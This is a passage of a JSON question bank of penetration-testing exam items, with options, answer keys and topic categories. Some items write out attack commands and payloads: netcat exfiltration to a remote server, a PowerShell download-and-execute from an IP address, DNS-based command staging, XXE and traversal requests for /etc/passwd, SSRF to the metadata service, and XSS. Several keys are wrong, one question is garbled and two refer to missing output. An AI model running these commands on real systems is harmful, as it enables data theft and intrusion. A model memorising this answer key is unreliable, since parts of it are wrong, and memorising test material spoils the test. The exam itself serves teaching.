+    "question": "A penetration tester observes the following output from an Nmap command while attempting to troubleshoot connectivity to a Linux server: Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-10 12:00 UTC Nmap scan report for example.com (192.168.1.10) Host is up (0.001s latency). Not shown: 9999 closed ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 2222/tcp open ssh 444/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds Which of the following is the most likely reason for the connectivity issue?",
+    "options": {
+      "A": "The SSH service is running on a different port.",
+      "B": "The SSH service is blocked by a firewall.",
+      "C": "The SSH service requires certificate authentication.",
+      "D": "The SSH service is not active."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 140,
+    "question": "During an internal penetration test, a tester compromises a Windows OS-based endpoint and bypasses the defensive mechanisms. The tester also discovers that the endpoint is part of an Active Directory (AD) local domain. The tester’s main goal is to leverage credentials to authenticate into other systems within the Active Directory environment. Which of the following steps should the tester take to complete the goal?",
+    "options": {
+      "A": "Use Mimikatz to collect information about the accounts and try to authenticate in other systems",
+      "B": "Use Hashcat to crack a password for the local user on the compromised endpoint",
+      "C": "Use Evil-WinRM to access other systems in the network within the endpoint credentials",
+      "D": "Use Metasploit to create and execute a payload and try to upload the payload into other systems"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 141,
+    "question": "A penetration tester is performing a cloud-based penetration test against a company. Stakeholders have indicated the priority is to see if the tester can get into privileged systems that are not directly accessible from the internet. Given the following scanner information: Server-side request forgery (SSRF) vulnerability in test.comptia.org Reflected cross-site scripting (XSS) vulnerability in test2.comptia.org Publicly accessible storage system named static_comptia_assets SSH port 22 open to the internet on test3.comptia.org Open redirect vulnerability in test4.comptia.org Which of the following attack paths should the tester prioritize first? A.",
+    "options": {
+      "A": "Synchronize all the information from the public bucket and scan it with Trufflehog.",
+      "B": "Run Pacu to enumerate permissions and roles within the cloud-based systems.",
+      "C": "Perform a full dictionary brute-force attack against the open SSH service using Hydra.",
+      "D": "Use the reflected cross-site scripting attack within a phishing campaign to attack administrators.",
+      "E": "Leverage the SSRF to gain access to credentials from the metadata service."
+    },
+    "correct": [
+      "E"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 142,
+    "question": "Which of the following methods should a physical penetration tester employ to access a rarely used door that has electronic locking mechanisms?",
+    "options": {
+      "A": "Lock picking",
+      "B": "Impersonating",
+      "C": "Jamming",
+      "D": "Tailgating",
+      "E": "Bypassing"
+    },
+    "correct": [
+      "E"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 143,
+    "question": "A penetration tester downloads a JAR file that is used in an organization's production environment. The tester evaluates the contents of the JAR file to identify potentially vulnerable components that can be targeted for exploit. Which of the following describes the tester's activities?",
+    "options": {
+      "A": "SAST",
+      "B": "SBOM",
+      "C": "ICS",
+      "D": "SCA"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 144,
+    "question": "A penetration tester performs an assessment on the target company's Kubernetes cluster using kube-hunter. Which of the following types of vulnerabilities could be detected with the tool?",
+    "options": {
+      "A": "Network configuration errors in Kubernetes services",
+      "B": "Weaknesses and misconfigurations in the Kubernetes cluster",
+      "C": "Application deployment issues in Kubernetes",
+      "D": "Security vulnerabilities specific to Docker containers"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 145,
+    "question": "A penetration tester assesses an application allow list and has limited command-line access on the Windows system. Which of the following would give the penetration tester information that could aid in continuing the test?",
+    "options": {
+      "A": "mmc.exe",
+      "B": "icacls.exe",
+      "C": "nltest.exe",
+      "D": "rundll.exe"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 146,
+    "question": "A penetration tester is evaluating a SCADA system. The tester receives local access to a workstation that is running a single application. While navigating through the application, the tester opens a terminal window and gains access to the underlying operating system. Which of the following attacks is the tester performing?",
+    "options": {
+      "A": "Kiosk escape",
+      "B": "Arbitrary code execution",
+      "C": "Process hollowing",
+      "D": "Library injection"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 147,
+    "question": "As part of a security audit, a penetration tester finds an internal application that accepts unexpected user inputs, leading to the execution of arbitrary commands. Which of the following techniques would the penetration tester most likely use to access the sensitive data?",
+    "options": {
+      "A": "Logic bomb",
+      "B": "SQL injection",
+      "C": "Brute-force attack",
+      "D": "Cross-site scripting"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 148,
+    "question": "A penetration tester completes a scan and sees the following output on a host: bash Copy code Nmap scan report for victim (10.10.10.10) Host is up (0.0001s latency) PORT STATE SERVICE 161/udp open|filtered snmp 445/tcp open microsoft-ds 3389/tcp open microsoft-ds Running Microsoft Windows 7 OS CPE: cpe:/o:microsoft:windows_7_sp0 The tester wants to obtain shell access. Which of the following related exploits should the tester try first?",
+    "options": {
+      "A": "exploit/windows/smb/psexec",
+      "B": "exploit/windows/smb/ms08_067_netapi",
+      "C": "exploit/windows/smb/ms17_010_eternalblue",
+      "D": "auxiliary/scanner/snmp/snmp_login"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 149,
+    "question": "Which of the following is most important when communicating the need for vulnerability remediation to a client at the conclusion of a penetration test?",
+    "options": {
+      "A": "Articulation of cause",
+      "B": "Articulation of impact",
+      "C": "Articulation of escalation",
+      "D": "Articulation of alignment"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Reporting and Communication"
+  },
+  {
+    "id": 150,
+    "question": "During an assessment, a penetration tester plans to gather metadata from various online files, including pictures. Which of the following standards outlines the formats for pictures, audio, and additional tags that facilitate this type of reconnaissance?",
+    "options": {
+      "A": "EXIF",
+      "B": "GIF",
+      "C": "COFF",
+      "D": "ELF"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 151,
+    "question": "Which of the following technologies is most likely used with badge cloning? (Select two).",
+    "options": {
+      "A": "NFC",
+      "B": "RFID",
+      "C": "Bluetooth",
+      "D": "Modbus",
+      "E": "Zigbee",
+      "F": "CAN bus"
+    },
+    "correct": [
+      "A",
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 152,
+    "question": "Which of the following tasks would ensure the key outputs from a penetration test are not lost as part of the cleanup and restoration activities?",
+    "options": {
+      "A": "Preserving artifacts",
+      "B": "Reverting configuration changes",
+      "C": "Keeping chain of custody",
+      "D": "Exporting credential data"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 153,
+    "question": "A penetration tester is conducting reconnaissance on a target network. The tester runs the following Nmap command: nmap -sv -sT -p - 192.168.1.0/24. Which of the following describes the most likely purpose of this scan?",
+    "options": {
+      "A": "OS fingerprinting",
+      "B": "Attack path mapping",
+      "C": "Service discovery",
+      "D": "User enumeration"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 154,
+    "question": "During a discussion of a penetration test final report, the consultant shows the following payload used to attack a system: html Copy code 7/<sCRitP>aLeRt('pwned')</ScriPt> Based on the code, which of the following options represents the attack executed by the tester and the associated countermeasure?",
+    "options": {
+      "A": "Arbitrary code execution: the affected computer should be placed on a perimeter network",
+      "B": "SQL injection attack: should be detected and prevented by a web application firewall",
+      "C": "Cross-site request forgery: should be detected and prevented by a firewall",
+      "D": "XSS obfuscated: should be prevented by input sanitization"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 155,
+    "question": "A company hires a penetration tester to test the security of its wireless networks. The main goal is to intercept and access sensitive data. Which of the following tools should the security professional use to best accomplish this task?",
+    "options": {
+      "A": "Metasploit",
+      "B": "WiFi-Pumpkin",
+      "C": "SET",
+      "D": "theHarvester",
+      "E": "WiGLE.net"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 156,
+    "question": "A penetration tester is searching for vulnerabilities or misconfigurations on a container environment. Which of the following tools will the tester most likely use to achieve this objective? A.",
+    "options": {
+      "A": "Nikto",
+      "B": "Trivy",
+      "C": "Nessus",
+      "D": "Nmap"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 157,
+    "question": "Which of the following is within the scope of proper handling and is most crucial when working on a penetration testing report?",
+    "options": {
+      "A": "Keeping both video and audio of everything that is done",
+      "B": "Keeping the report to a maximum of 5 to 10 pages in length",
+      "C": "Basing the recommendation on the risk score in the report",
+      "D": "Making the report clear for all objectives with a precise executive summary"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 158,
+    "question": "A tester is finishing an engagement and needs to ensure that artifacts resulting from the test are safely handled. Which of the following is the best procedure for maintaining client data privacy?",
+    "options": {
+      "A": "Remove configuration changes and any tools deployed to compromised systems.",
+      "B": "Securely destroy or remove all engagement-related data from testing systems.",
+      "C": "Search through configuration files changed for sensitive credentials and remove them.",
+      "D": "Shut down C2 and attacker infrastructure on premises and in the cloud."
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 159,
+    "question": "A penetration tester needs to evaluate the order in which the next systems will be selected for testing. Given the following output: Which of the following targets should the tester select next?",
+    "options": {
+      "A": "fileserver",
+      "B": "hrdatabase",
+      "C": "legaldatabase",
+      "D": "financesite"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 160,
+    "question": "A penetration tester finds that an application responds with the contents of the /etc/passwd file when the following payload is sent: xml Copy code <?xml version=\"1.0\"?> <!DOCTYPE data [ <!ENTITY foo SYSTEM \"file:///etc/passwd\" > ]> <test>&foo;</test> Which of the following should the tester recommend in the report to best prevent this type of vulnerability?",
+    "options": {
+      "A": "Drop all excessive file permissions with chmod o-rwx.",
+      "B": "Ensure the requests application access logs are reviewed frequently.",
+      "C": "Disable the use of external entities.",
+      "D": "Implement a WAF to filter all incoming requests."
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 161,
+    "question": "A tester enumerated a firewall policy and now needs to stage and exfiltrate data captured from the engagement. Given the following firewall policy: Action | SRC | DEST | -- Block | 192.168.10.0/24 : 1-65535 | 10.0.0.0/24 : 22 | TCP Allow | 0.0.0.0/0 : 1-65535 | 192.168.10.0/24:443 | TCP Allow | 192.168.10.0/24 : 1-65535 | 0.0.0.0/0:443 | TCP Block | . | . | * Which of the following commands should the tester try next?",
+    "options": {
+      "A": "tar -zcvf /tmp/data.tar.gz /path/to/data && nc -w 3 <remote_server> 443 < /tmp/data.tar.gz",
+      "B": "gzip /path/to/data && cp data.gz <remote_server> 443",
+      "C": "gzip /path/to/data && nc -nvlk 443; cat data.gz ' nc -w 3 <remote_server> 22",
+      "D": "tar -zcvf /tmp/data.tar.gz /path/to/data && scp /tmp/data.tar.gz <remote_server>"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 162,
+    "question": "A penetration tester needs to help create a threat model of a custom application. Which of the following is the most likely framework the tester will use?",
+    "options": {
+      "A": "MITRE ATT&CK",
+      "B": "OSSTMM",
+      "C": "CI/CD",
+      "D": "DREAD"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 163,
+    "question": "A penetration tester obtains password dumps associated with the target and identifies strict lockout policies. The tester does not want to lock out accounts when attempting access. Which of the following techniques should the tester use?",
+    "options": {
+      "A": "Credential stuffing",
+      "B": "MFA fatigue",
+      "C": "Dictionary attack",
+      "D": "Brute-force attack"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 164,
+    "question": "During a security assessment, a penetration tester gains access to an internal server and manipulates some data to hide its presence. Which of the following is the best way for the penetration tester to hide the activities performed?",
+    "options": {
+      "A": "Clear the Windows event logs.",
+      "B": "Modify the system time.",
+      "C": "Alter the log permissions.",
+      "D": "Reduce the log retention settings."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 165,
+    "question": "A penetration tester gains access to a Windows machine and wants to further enumerate users with native operating system credentials. Which of the following should the tester use?",
+    "options": {
+      "A": "route.exe print",
+      "B": "netstat.exe -ntp",
+      "C": "net.exe commands",
+      "D": "strings.exe -a"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 166,
+    "question": "An external legal firm is conducting a penetration test of a large corporation. Which of the following would be most appropriate for the legal firm to use in the subject line of a weekly email update?",
+    "options": {
+      "A": "Privileged & Confidential Status Update",
+      "B": "Action Required Status Update",
+      "C": "Important Weekly Status Update",
+      "D": "Urgent Status Update"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 167,
+    "question": "Given the following script: $1 = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.split(\"\\\")[1] If ($1 -eq \"administrator\") { echo IEX(New-Object Net.WebClient).Downloadstring('http://10.10.11.12:8080/ul/windows.ps1') | powershell -noprofile -} Which of the following is the penetration tester most likely trying to do?",
+    "options": {
+      "A": "Change the system's wallpaper based on the current user's preferences.",
+      "B": "Capture the administrator's password and transmit it to a remote server.",
+      "C": "Conditionally stage and execute a remote script.",
+      "D": "Log the internet browsing history for a systems administrator."
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 168,
+    "question": "Which of the following will reduce the possibility of introducing errors or bias in a penetration test report?",
+    "options": {
+      "A": "Secure distribution",
+      "B": "Peer review",
+      "C": "Use AI",
+      "D": "Goal reprioritization"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Reporting and Communication"
+  },
+  {
+    "id": 169,
+    "question": "A tester completed a report for a new client. Prior to sharing the report with the client, which of the following should the tester request to complete a review?",
+    "options": {
+      "A": "A generative AI assistant",
+      "B": "The customer's designated contact",
+      "C": "A cybersecurity industry peer",
+      "D": "A team member"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Reporting and Communication"
+  },
+  {
+    "id": 170,
+    "question": "A penetration tester is trying to get unauthorized access to a web application and executes the following command: GET /foo/images/file?id=2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd Which of the following web application attacks is the tester performing?",
+    "options": {
+      "A": "Insecure Direct Object Reference",
+      "B": "Cross-Site Request Forgery",
+      "C": "Directory Traversal",
+      "D": "Local File Inclusion"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 171,
+    "question": "Which of the following is the most efficient way to exfiltrate a file containing data that could be sensitive?",
+    "options": {
+      "A": "Use steganography and send the file over FTP.",
+      "B": "Compress the file and send it using TFTP.",
+      "C": "Split the file in tiny pieces and send it over dnscat.",
+      "D": "Encrypt and send the file over HTTPS."
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 172,
+    "question": "During a red-team exercise, a penetration tester obtains an employee's access badge. The tester uses the badge’ s information to create a duplicate for unauthorized entry. Which of the following best describes this action?",
+    "options": {
+      "A": "Smurfing",
+      "B": "Credential stuffing",
+      "C": "RFID cloning",
+      "D": "Card skimming"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 173,
+    "question": "A penetration tester wants to use multiple TTPs to assess the reactions (alerted, blocked, and others) by the client’s current security tools. The threat-modeling team indicates the TTPs in the list might affect their internal systems and servers. Which of the following actions would the tester most likely take?",
+    "options": {
+      "A": "Use a BAS tool to test multiple TTPs based on the input from the threat-modeling team.",
+      "B": "Perform an internal vulnerability assessment with credentials to review the internal attack surface.",
+      "C": "Use a generic vulnerability scanner to test the TTPs and review the results with the threat-modeling",
+      "D": "Perform a full internal penetration test to review all the possible exploits that could affect the systems."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 174,
+    "question": "A penetration tester discovers data to stage and exfiltrate. The client has authorized movement to the tester's attacking hosts only. Which of the following would be most appropriate to avoid alerting the SOC?",
+    "options": {
+      "A": "Apply UTF-8 to the data and send over a tunnel to TCP port 25.",
+      "B": "Apply Base64 to the data and send over a tunnel to TCP port 80.",
+      "C": "Apply 3DES to the data and send over a tunnel UDP port 53.",
+      "D": "Apply AES-256 to the data and send over a tunnel to TCP port 443."
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 176,
+    "question": "During an assessment, a penetration tester gains a low-privilege shell and then runs the following command: findstr /SIM /C:\"pass\" *.txt *.cfg *.xml Which of the following is the penetration tester trying to enumerate?",
+    "options": {
+      "A": "Configuration files",
+      "B": "Permissions",
+      "C": "Virtual hosts",
+      "D": "Secrets"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 177,
+    "question": "Which of the following OT protocols sends information in cleartext?",
+    "options": {
+      "A": "TTEthernet",
+      "B": "DNP3",
+      "C": "Modbus",
+      "D": "PROFINET"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 178,
+    "question": "A penetration tester must identify vulnerabilities within an ICS (Industrial Control System) that is not connected to the internet or enterprise network. Which of the following should the tester utilize to conduct the testing?",
+    "options": {
+      "A": "Channel scanning",
+      "B": "Stealth scans",
+      "C": "Source code analysis",
+      "D": "Manual assessment"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 180,
+    "question": "A penetration tester is working on an engagement in which a main objective is to collect confidential information that could be used to exfiltrate data and perform a ransomware attack. During the engagement, the tester is able to obtain an internal foothold on the target network. Which of the following is the next task the tester should complete to accomplish the objective?",
+    "options": {
+      "A": "Initiate a social engineering campaign.",
+      "B": "Perform credential dumping.",
+      "C": "Compromise an endpoint.",
+      "D": "Share enumeration."
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 181,
+    "question": "A penetration tester has been asked to conduct a blind web application test against a customer's corporate website. Which of the following tools would be best suited to perform this assessment?",
+    "options": {
+      "A": "ZAP",
+      "B": "Nmap",
+      "C": "Wfuzz",
+      "D": "Trufflehog"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 182,
+    "question": "During a security audit, a penetration tester wants to run a process to gather information about a target network's domain structure and associated IP addresses. Which of the following tools should the tester use?",
+    "options": {
+      "A": "Dnsenum",
+      "B": "Nmap",
+      "C": "Netcat",
+      "D": "Wireshark"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 183,
+    "question": "Which of the following are valid reasons for including base, temporal, and environmental CVSS metrics in the findings section of a penetration testing report? (Select two).",
+    "options": {
+      "A": "Providing details on how to remediate vulnerabilities",
+      "B": "Helping to prioritize remediation based on threat context",
+      "C": "Including links to the proof-of-concept exploit itself",
+      "D": "Providing information on attack complexity and vector",
+      "E": "Prioritizing compliance information needed for an audit",
+      "F": "Adding risk levels to each asset"
+    },
+    "correct": [
+      "B",
+      "D"
+    ],
+    "category": "Reporting and Communication"
+  },
+  {
+    "id": 184,
+    "question": "A penetration tester writes the following script to enumerate a /24 network: 1 #!/bin/bash 2 for i in {1..254} 3 ping -c1 192.168.1.$i 4 done The tester executes the script, but it fails with the following error: -bash: syntax error near unexpected token 'ping' Which of the following should the tester do to fix the error?",
+    "options": {
+      "A": "Add do after line 2",
+      "B": "Replace {1..254} with $(seq 1 254)",
+      "C": "Replace bash with zsh",
+      "D": "Replace $i with ${i}"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 185,
+    "question": "A tester compromises a target host and then wants to maintain persistent access. Which of the following is the best way for the attacker to accomplish the objective?",
+    "options": {
+      "A": "Configure and register a service.",
+      "B": "Install and run remote desktop software.",
+      "C": "Set up a script to be run when users log in.",
+      "D": "Perform a kerberoasting attack on the host."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 186,
+    "question": "A penetration tester needs to complete cleanup activities from the testing lead. Which of the following should the tester do to validate that reverse shell payloads are no longer running?",
+    "options": {
+      "A": "Run scripts to terminate the implant on affected hosts.",
+      "B": "Spin down the C2 listeners.",
+      "C": "Restore the firewall settings of the original affected hosts.",
+      "D": "Exit from C2 listener active sessions."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 187,
+    "question": "A penetration tester writes the following script, which is designed to hide communication and bypass some restrictions on a client's network: $base64cmd = Resolve-DnsName foo.comptia.org -Type TXT | Select-Object -ExpandProperty Strings $decodecmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String ($base64cmd)) Powershell -C $decodecmd Which of the following best describes the technique the tester is applying?",
+    "options": {
+      "A": "DNS poisoning",
+      "B": "DNS infiltration",
+      "C": "DNS trail",
+      "D": "DNS tunneling"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 188,
+    "question": "During an assessment, a penetration tester obtains an NTLM hash from a legacy Windows machine. Which of the following tools should the penetration tester use to continue the attack?",
+    "options": {
+      "A": "Responder",
+      "B": "Hydra",
+      "C": "BloodHound",
+      "D": "CrackMapExec"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 189,
+    "question": "A tester needs to begin capturing WLAN credentials for cracking during an on-site engagement. Which of the following is the best command to capture handshakes?",
+    "options": {
+      "A": "tcpdump -n -s0 -w <pcapname> -i <iface>",
+      "B": "airserv-ng -d <iface>",
+      "C": "aireplay-ng -0 1000 -a <target_mac>",
+      "D": "airodump-ng -c 6 --bssid <target_mac> <iface>"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 190,
+    "question": "A penetration tester writes a Bash script to automate the execution of a ping command on a Class C network: for var in --MISSING TEXT-- do ping -c 1 192.168.10.$var done Which of the following pieces of code should the penetration tester use in place of —MISSING TEXT—?",
+    "options": {
+      "A": "crunch 1 254 loop",
+      "B": "seq 1 254",
+      "C": "echo 1-254",
+      "D": "fl..254"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 191,
+    "question": "A penetration tester is enumerating a Linux system. The goal is to modify the following script to provide more comprehensive system information: #!/bin/bash ps aux >> linux_enum.txt Which of the following lines would provide the most comprehensive enumeration of the system?",
+    "options": {
+      "A": "cat /etc/passwd >> linux_enum.txt; netstat -tuln >> linux_enum.txt; cat /etc/bash.bashrc >> linux_enum.",
+      "B": "whoami >> linux_enum.txt; uname -a >> linux_enum.txt; ifconfig >> linux_enum.txt",
+      "C": "hostname >> linux_enum.txt; echo $USER >> linux_enum.txt; curl ifconfig.me >> linux_enum.txt",
+      "D": "lsof -i >> linux_enum.txt; uname -a >> linux_enum.txt; ls /home/ >> linux_enum.txt"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 192,
+    "question": "A penetration tester finds it is possible to downgrade a web application's HTTPS connections to HTTP while performing on-path attacks on the local network. The tester reviews the output of the server response to: curl -s -i https://internalapp/ HTTP/2 302 date: Thu, 11 Jan 2024 15:56:24 GMT content-type: text/html; charset=iso-8659-1 location: /login x-content-type-options: nosniff server: Prod Which of the following recommendations should the penetration tester include in the report?",
+    "options": {
+      "A": "Add the HSTS header to the server.",
+      "B": "Attach the httponly flag to cookies.",
+      "C": "Front the web application with a firewall rule to block access to port 80.",
+      "D": "Remove the x-content-type-options header."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Reporting and Communication"
+  },
+  {
+    "id": 194,
+    "question": "A penetration tester runs a vulnerability scan that identifies several issues across numerous customer hosts. The executive report outlines the following information: Server High-severity vulnerabilities 1. Development sandbox server 32 2. Back office file transfer server 51 3. Perimeter network web server 14 4. Developer QA server 92 The client is con ble monitoring mode using Aircrack-ng ch of the following hosts should the penetration tester select for additional manual testing?",
+    "options": {
+      "A": "Server 1",
+      "B": "Server 2",
+      "C": "Server 3",
+      "D": "Server 4"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 195,
+    "question": "A penetration tester has found a web application that is running on a cloud virtual machine instance. Vulnerability scans show a potential SSRF for the same application URL path with an injectable parameter. Which of the following commands should the tester run to successfully test for secrets exposure exploitability?",
+    "options": {
+      "A": "curl <url>?param=http://169.254.169.254/latest/meta-data/",
+      "B": "curl '<url>?param=http://127.0.0.1/etc/passwd'",
+      "C": "curl '<url>?param=<script>alert(1)<script>/'",
+      "D": "curl <url>?param=http://127.0.0.1/"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 196,
+    "question": "A company hires a penetration tester to test the security implementation of its wireless networks. The main goal for this assessment is to intercept and get access to sensitive data from the company's employees. Which of the following tools should the security professional use to best accomplish this task?",
+    "options": {
+      "A": "Metasploit",
+      "B": "WiFi-Pumpkin",
+      "C": "SET",
+      "D": "theHarvester",
+      "E": "WiGLE.net"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 197,
+    "question": "A penetration tester has just started a new engagement. The tester is using a framework that breaks the life cycle into 14 components. Which of the following frameworks is the tester using?",
+    "options": {
+      "A": "OWASP MASVS",
+      "B": "OSSTMM",
+      "C": "MITRE ATT&CK",
+      "D": "CREST"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 198,
+    "question": "During an assessment, a penetration tester runs the following command from a Linux machine: GetUsersSPNs.py -dc-ip 172.16.1.1 DOMAIN.LOCAL/aholliday -request Which of the following is the penetration tester trying to do?",
+    "options": {
+      "A": "Crack the user password for aholliday",
+      "B": "Download all TGS tickets for offline processing",
+      "C": "Perform a pass-the-hash attack using the hash for aholliday",
+      "D": "Perform password spraying"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 199,
+    "question": "During an engagement, a penetration tester runs the following command against the host system: host -t axfr domain.com dnsl.domain.com Which of the following techniques best describes what the tester is doing?",
+    "options": {
+      "A": "Zone transfer",
+      "B": "Host enumeration",
+      "C": "DNS poisoning",
+      "D": "DNS query"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 200,
+    "question": "Which of the following elements in a lock should be aligned to a specific level to allow the key cylinder to turn?",
+    "options": {
+      "A": "Latches",
+      "B": "Pins",
+      "C": "Shackle",
+      "D": "Plug"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 201,
+    "question": "A penetration tester executes multiple enumeration commands to find a path to escalate privileges. Given the following command: find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null Which of the following is the penetration tester attempting to enumerate?",
+    "options": {
+      "A": "Attack path mapping",
+      "B": "API keys",
+      "C": "Passwords",
+      "D": "Permission"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 202,
+    "question": "A penetration tester is trying to execute a post-exploitation activity and creates the follow script: Which of the following best describes the tester's objective?",
+    "options": {
+      "A": "To download data from an API endpoint",
+      "B": "To download data from a cloud storage",
+      "C": "To exfiltrate data over alternate data streams",
+      "D": "To exfiltrate data to cloud storage"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 203,
+    "question": "A penetration tester finishes a security scan and uncovers numerous vulnerabilities on several hosts. Based on the targets' EPSS (Exploit Prediction Scoring System) and CVSS (Common Vulnerability Scoring System) scores, which of the following targets is the most likely to get attacked?",
+    "options": {
+      "A": "Target 1: EPSS Score = 0.6, CVSS Score = 4",
+      "B": "Target 2: EPSS Score = 0.3, CVSS Score = 2",
+      "C": "Target 3: EPSS Score = 0.6, CVSS Score = 1",
+      "D": "Target 4: EPSS Score = 0.4, CVSS Score = 4.5"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 204,
+    "question": "While conducting OSINT, a penetration tester discovers the client's administrator posted part of an unsanitized firewall configuration to a troubleshooting message board. Which of the following did the penetration tester most likely use?",
+    "options": {
+      "A": "HTML scraping",
+      "B": "Public code repository scanning",
+      "C": "Wayback Machine",
+      "D": "Search engine enumeration"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 205,
+    "question": "A penetration tester sets up a C2 (Command and Control) server to manage and control payloads deployed in the target network. Which of the following tools is the most suitable for establishing a robust and stealthy connection?",
+    "options": {
+      "A": "ProxyChains",
+      "B": "Covenant",
+      "C": "PsExec",
+      "D": "sshuttle"
+    },
+    "correct": [
+      "B"
+    ],
